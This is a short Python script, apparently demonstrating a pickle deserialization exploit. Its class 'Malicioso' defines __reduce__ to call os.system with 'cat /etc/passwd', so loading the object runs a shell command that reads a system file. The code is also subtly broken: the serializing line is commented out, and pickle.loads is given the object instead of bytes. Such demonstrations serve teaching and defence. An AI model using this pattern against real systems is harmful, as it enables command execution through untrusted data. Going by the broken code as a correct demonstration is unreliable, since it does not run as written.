import os, pickle


class Malicioso:
    def __reduce__(self):
        return (os.system, ("cat /etc/passwd",))

# carga = pickle.dumps(Malicioso())

# print(carga)

picked = pickle.loads(Malicioso())

print(picked)